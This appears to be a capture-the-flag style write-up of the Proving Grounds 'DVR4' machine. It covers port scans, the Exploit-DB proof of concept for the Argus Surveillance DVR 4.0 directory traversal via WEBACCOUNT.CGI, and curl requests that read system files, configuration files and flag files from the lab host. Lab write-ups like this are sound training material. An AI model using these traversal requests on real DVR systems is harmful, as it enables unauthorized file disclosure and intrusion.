# DVR4

# Enumeration

## nmap

```
# Nmap 7.91 scan initiated Thu Feb 17 05:06:54 2022 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/DVR4/results/192.168.105.179/scans/_full_tcp_nmap.txt" -oX "/media/sf_Stuff/Github/Solutions/Cyber Security/Penetration Testing Exercises/Offensive Security/Proving Ground Practices/DVR4/results/192.168.105.179/scans/xml/_full_tcp_nmap.xml" 192.168.105.179
Nmap scan report for 192.168.105.179
Host is up, received user-set (0.18s latency).
Scanned at 2022-02-17 05:06:55 EST for 376s
Not shown: 65534 filtered ports
Reason: 65534 no-responses
PORT   STATE SERVICE REASON          VERSION
22/tcp open  ssh     syn-ack ttl 127 Bitvise WinSSHD 8.48 (FlowSsh 8.48; protocol 2.0; non-commercial use)
| ssh-hostkey: 
|   3072 21:25:f0:53:b4:99:0f:34:de:2d:ca:bc:5d:fe:20:ce (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsljcHdJN7STx92SFZR/dtzDsO0v1blAoUfqWva1WJD9WXeKe0S9Oeg4L1eXC6ik5O6+lE7SRqz7Qiudrhk9CXxB0tmmX2SpZKMg1l01wmO5QEhpeuhDOb062dCDc1byOkpbBJq93afwVOEiaCOMVVjnwvJ5MFmZQzBcb02rmHKH7+o2BjMukTA8coWhCc2cqyEgPA031zSYCkdzxLlgHJMUlbDDtD0D143rLPZ6CtP5Nbxpbt/2Hj3thq7GQzToNdgCYCEIMg6Gs4xYHLO4lKcOb92wFdEtx+hA7xFxGOldfmEU4f3jyDSFazolJU4TxzewQ/kIi1W4Cj+tarEVTC6sBUAhHZSLAj5nkz7rljJIXiM8hYp6VMcpsqa1dtlwspeiFXL2RizuQgUzabzsQGmZ0Yu501ieYy1i7mIEWzO2UUx3tnCn9YKAh30jYQQvXYB+oUGuQqDIQh1f0Ds/Jd1IkFMJ8EZQ8Iaoa1UVpxupdZ8jtBm3BKT5+sVtJ4jwE=
|   384 e7:96:f3:6a:d8:92:07:5a:bf:37:06:86:0a:31:73:19 (ECDSA)
|_ecdsa-sha2-nistp384 AAAAE2VjZHNhLXNoYTItbmlzdHAzODQAAAAIbmlzdHAzODQAAABhBEqSs/ONYXuZGcGBUkLstnAWRP6wNsuJz6yUtmYymbBUobb797y3tkgWkCUhaDsB3z8XzhgoyCXS6MuXqF3FmiapitvPj1ig5TnVnHRvzuB2beKi/cH2XBduyaaKO6AORg==
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows XP|7 (89%)
OS CPE: cpe:/o:microsoft:windows_xp::sp3 cpe:/o:microsoft:windows_7
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows XP SP3 (89%), Microsoft Windows XP SP2 (86%), Microsoft Windows 7 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=2/17%OT=22%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=620E1FB8%P=x86_64-pc-linux-gnu)
SEQ(SP=106%GCD=1%ISR=10B%TI=I%II=I%SS=S%TS=U)
OPS(O1=M54ENW8NNS%O2=M54ENW8NNS%O3=M54ENW8%O4=M54ENW8NNS%O5=M54ENW8NNS%O6=M54ENNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M54ENW8NNS%CC=N%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   179.13 ms 192.168.49.1
2   181.97 ms 192.168.105.179

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb 17 05:13:12 2022 -- 1 IP address (1 host up) scanned in 378.78 seconds
```

## Rustscan

```
┌──(kali㉿kali)-[~]
└─$ rustscan -a 192.168.105.179
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
😵 https://admin.tryhackme.com

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 192.168.105.179:22
Open 192.168.105.179:8080
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.91 ( https://nmap.org ) at 2022-02-17 05:23 EST
Initiating Ping Scan at 05:23
Scanning 192.168.105.179 [2 ports]
Completed Ping Scan at 05:23, 3.00s elapsed (1 total hosts)
Nmap scan report for 192.168.105.179 [host down, received no-response]
Read data files from: /usr/bin/../share/nmap
Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn
Nmap done: 1 IP address (0 hosts up) scanned in 3.08 seconds

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 

```

## Web - 8080

![](Pasted%20image%2020220217182543.png)

![](Pasted%20image%2020220217190204.png)

![](Pasted%20image%2020220217191406.png)

https://www.google.com/search?q=Argus+security+DVR+exploit&rlz=1C1ONGR_enSG945SG945&sxsrf=APq-WBve3bH4UUlzpm3y1USe2Fmd6iS9bw%3A1645093396043&ei=FCIOYv2TAr6RseMP7ti70AQ&ved=0ahUKEwj97fi7wob2AhW-SGwGHW7sDkoQ4dUDCA8&uact=5&oq=Argus+security+DVR+exploit&gs_lcp=Cgxnd3Mtd2l6LXNlcnAQAzoHCAAQRxCwAzoGCAAQFhAeOggIIRAWEB0QHjoFCCEQoAE6BwghEAoQoAFKBAhBGABKBAhGGABQ0gZY_RhgqBpoAXABeACAAXKIAZEFkgEDNy4xmAEAoAEByAEIwAEB&sclient=gws-wiz-serp

### Exploits

```
┌──(kali㉿kali)-[~]
└─$ searchsploit Argus   
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Argus Surveillance DVR 4.0 - Unquoted Service Path                                                                                    | windows/local/50261.txt
Argus Surveillance DVR 4.0 - Weak Password Encryption                                                                                 | windows/local/50130.py
Argus Surveillance DVR 4.0.0.0 - Directory Traversal                                                                                  | windows_x86/webapps/45296.txt
Argus Surveillance DVR 4.0.0.0 - Privilege Escalation                                                                                 | windows_x86/local/45312.c
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ searchsploit -m 45296    
  Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
      URL: https://www.exploit-db.com/exploits/45296
     Path: /usr/share/exploitdb/exploits/windows_x86/webapps/45296.txt
File Type: ASCII text

Copied to: /home/kali/45296.txt


                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ cat 45296.txt   
# Exploit: Argus Surveillance DVR 4.0.0.0 - Directory Traversal
# Author: John Page (aka hyp3rlinx)
# Date: 2018-08-28
# Vendor: www.argussurveillance.com
# Software Link: http://www.argussurveillance.com/download/DVR_stp.exe
# CVE: N/A

# Description:
# Argus Surveillance DVR 4.0.0.0 devices allow Unauthenticated Directory Traversal,
# leading to File Disclosure via a ..%2F in the WEBACCOUNT.CGI RESULTPAGE parameter.

# PoC

curl "http://VICTIM-IP:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="

# Result:

; for 16-bit app support
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

wave=mmdrv.dll
timer=timer.drv

# https://vimeo.com/287115273
# Greetz: ***Greetz: indoushka | Eduardo | GGA***                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ rm 45296.txt               
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.105.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2Fsystem.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]

                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

### Try Weak passwords
Nope

https://www.exploit-db.com/exploits/50130
https://leobreaker1411.github.io/blog/dvr4-hash-crack


```bash
┌──(kali㉿kali)-[~]
└─$ URL="/ProgramData/PY_Software/Argus Surveillance DVR/DVRParams.ini"
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ curl "http://192.168.105.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..$(urlencode $URL)&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
[Main]
ServerName=
ServerLocation=
ServerDescription=
ReadH=0
UseDialUp=0
DialUpConName=
DialUpDisconnectWhenDone=0
DIALUPUSEDEFAULTS" checked checked
                                                                                                                                                                        
┌──(kali㉿kali)-[~]
└─$ 
```

# Exploitation

## Leaking flags

```bash
┌──(kali㉿kali)-[/tmp]
└─$ URL="/Users/Administrator/Desktop/proof.txt"          
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.108.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..$(urlencode $URL)&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
704e0cb11c9984386c238dd1d7820c50

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ URL="/Users/Viewer/Desktop/local.txt"
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.108.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..$(urlencode $URL)&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
1f0e8a6e1498f4d2b8e285a5d99e6082

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

## Test LFI

http://192.168.108.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..$(urlencode $URL)&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD

```
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.108.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..%2F..$(urlencode $URL)&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" 
[Main]
ServerName=
ServerLocation=
ServerDescription=
ReadH=0
UseDialUp=0
DialUpConName=
DialUpDisconnectWhenDone=0
DIALUPUSEDEFAULTS" checked checked
                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.108.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=..%2F..%2F..$(urlencode $URL)&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
<HTML><HEAD><TITLE>File Not Found</TITLE></HEAD><BODY><H1>Cannot find this file.</H1>The requested file: <B>/WEBACCOUNT.CGI?OkBtn=  Ok  &RESULTPAGE=../../../ProgramData/PY_Software/Argus Surveillance DVR/DVRParams.ini&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=</B> was not found.</BODY></HTML>                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
```

Works for any CGI/nonexistent file, which does not appear to exist too

```
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.108.179:8080/WEBACCOUNT.CGI?OkBtn=++Ok++&RESULTPAGE=Cameras.html&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
<HTML>
<HEAD>
<TITLE>
Argus Surveillance DVR
</TITLE>

<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">

<frameset frameborder="no" border="0" rows="75,*,88">
  <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0">  
  <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
  <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0">  
  <noframes>
    <p>This page uses frames, but your browser doesn't support them.</p>
  </noframes>
</frameset>
</HEAD>

<BODY bgcolor="#CDDBFF" text="#000000" link="#000000" vlink="#000000" alink="#000000" topmargin=0, leftmargin=0, rightmargin=0, marginheight=0, marginwidth=0>

</BODY>
</HTML>

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.108.179:8080/USERS.CGI?OkBtn=++Ok++&RESULTPAGE=Cameras.html&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD="
<HTML>
<HEAD>
<TITLE>
Argus Surveillance DVR
</TITLE>

<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">

<frameset frameborder="no" border="0" rows="75,*,88">
  <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0">  
  <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
  <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0">  
  <noframes>
    <p>This page uses frames, but your browser doesn't support them.</p>
  </noframes>
</frameset>
</HEAD>

<BODY bgcolor="#CDDBFF" text="#000000" link="#000000" vlink="#000000" alink="#000000" topmargin=0, leftmargin=0, rightmargin=0, marginheight=0, marginwidth=0>

</BODY>
</HTML>

                                                                                                                                                                        
┌──(kali㉿kali)-[/tmp]
└─$ 
┌──(kali㉿kali)-[/tmp]
└─$ curl "http://192.168.108.179:8080/C?OkBtn=++Ok++&RESULTPAGE=Cameras.html&USEREDIRECT=1&WEBACCOUNTID=&WEBACCOUNTPASSWORD=" 
<HTML>
<HEAD>
<TITLE>
Argus Surveillance DVR
</TITLE>

<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
<meta name="GENERATOR" content="Actual Drawing 6.0 (http://www.pysoft.com) [PYSOFTWARE]">

<frameset frameborder="no" border="0" rows="75,*,88">
  <frame name="Top" frameborder="0" scrolling="auto" noresize src="CamerasTopFrame.html" marginwidth="0" marginheight="0">  
  <frame name="ActiveXFrame" frameborder="0" scrolling="auto" noresize src="ActiveXIFrame.html" marginwidth="0" marginheight="0">
  <frame name="CamerasTable" frameborder="0" scrolling="auto" noresize src="CamerasBottomFrame.html" marginwidth="0" marginheight="0">  
  <noframes>
    <p>This page uses frames, but your browser doesn't support them.</p>
  </noframes>
</frameset>
</HEAD>

<BODY bgcolor="#CDDBFF" text="#000000" link="#000000" vlink="#000000" alink="#000000" topmargin=0, leftmargin=0, rightmargin=0, marginheight=0, marginwidth=0>

</BODY>
</HTML>

```